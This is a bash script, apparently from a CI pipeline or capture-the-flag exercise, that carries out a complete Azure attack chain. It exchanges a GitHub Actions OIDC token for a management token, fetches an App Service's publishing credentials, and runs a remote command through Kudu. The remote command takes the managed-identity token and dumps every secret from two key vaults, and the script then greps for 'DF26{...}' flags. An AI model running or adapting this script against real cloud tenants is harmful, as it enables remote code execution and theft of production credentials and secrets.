#!/usr/bin/env bash
set +e
SITE="app-tbl-storefront-prod"; RG="rg-tbl-platform-prod-sea"
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c "import json,sys;print(json.load(sys.stdin)['value'])")
get_tok(){ curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
  -d "client_id=${AZURE_CLIENT_ID}" -d "scope=$1" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=${OIDC}" | python3 -c "import json,sys;d=json.load(sys.stdin);print(d.get('access_token') or 'ERR:'+str(d.get('error_description'))[:200])"; }
ARM=$(get_tok "https://management.azure.com/.default")
echo "ARM token: ${ARM:0:3}... len=${#ARM}"
BASE="https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourceGroups/${RG}/providers/Microsoft.Web/sites/${SITE}"

echo "=== publishing credentials ==="
PUB=$(curl -sS -X POST -H "Authorization: Bearer $ARM" -H "Content-Length: 0" "${BASE}/config/publishingcredentials/list?api-version=2022-09-01")
echo "$PUB" | python3 -c "import json,sys;d=json.load(sys.stdin);p=d.get('properties',d);print('scmUri present:', 'publishingUserName' in p); print('user:',p.get('publishingUserName'))" 2>&1 | head -5
USER=$(echo "$PUB" | python3 -c "import json,sys;d=json.load(sys.stdin);print(d.get('properties',d).get('publishingUserName',''))" 2>/dev/null)
PASS=$(echo "$PUB" | python3 -c "import json,sys;d=json.load(sys.stdin);print(d.get('properties',d).get('publishingPassword',''))" 2>/dev/null)
SCM="https://${SITE}.scm.azurewebsites.net"

# Kudu command: read MI token from the running App Service and query kv-tbl-sec. Non-destructive.
read -r -d '' REMOTE <<'EOS'
IE="$IDENTITY_ENDPOINT"; IH="$IDENTITY_HEADER";
echo "IDENTITY_ENDPOINT set: ${IE:+yes}; header set: ${IH:+yes}";
VT=$(curl -s -H "X-IDENTITY-HEADER: $IH" "${IE}?resource=https%3A%2F%2Fvault.azure.net&api-version=2019-08-01" | python3 -c "import json,sys;print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null);
echo "vault token len: ${#VT}";
for KV in kv-tbl-sec-x3euoz kv-tbl-prod-x3euoz; do
  echo "== $KV ==";
  LST=$(curl -s -H "Authorization: Bearer $VT" "https://$KV.vault.azure.net/secrets?api-version=7.4");
  echo "$LST" | python3 -c "import json,sys
try:
 d=json.load(sys.stdin)
 for s in d.get('value',[]): print('SECRETID',s['id'])
except Exception as e: print('listerr',str(e)[:120])";
  for NM in $(echo "$LST" | python3 -c "import json,sys
try:
 d=json.load(sys.stdin)
 [print(s['id'].rstrip('/').split('/')[-1]) for s in d.get('value',[])]
except: pass"); do
    V=$(curl -s -H "Authorization: Bearer $VT" "https://$KV.vault.azure.net/secrets/$NM?api-version=7.4");
    echo "SECRET $NM = $(echo "$V" | python3 -c "import json,sys;print(json.load(sys.stdin).get('value'))" 2>/dev/null)";
  done;
done
EOS

echo "=== invoking Kudu /api/command (basic auth) ==="
if [ -n "$USER" ]; then
  RESP=$(curl -sS -u "$USER:$PASS" -H "Content-Type: application/json" -X POST "$SCM/api/command" \
    -d "$(python3 -c "import json,sys;print(json.dumps({'command':'bash -lc '+json.dumps(sys.argv[1]),'dir':'/'}))" "$REMOTE")")
  echo "$RESP" | python3 -c "import json,sys;d=json.load(sys.stdin);print('--- STDOUT ---');print(d.get('Output',''));print('--- STDERR ---');print(d.get('Error',''))" 2>&1 | head -60
  echo "$RESP" | grep -oE 'DF26\{[0-9a-fA-F]+\}' | sort -u
else
  echo "no publishing user; trying ARM-token Kudu"
  RESP=$(curl -sS -H "Authorization: Bearer $ARM" -H "Content-Type: application/json" -X POST "$SCM/api/command" \
    -d "$(python3 -c "import json,sys;print(json.dumps({'command':'bash -lc '+json.dumps(sys.argv[1]),'dir':'/'}))" "$REMOTE")")
  echo "$RESP" | head -c 1500
fi
echo "=== done ==="
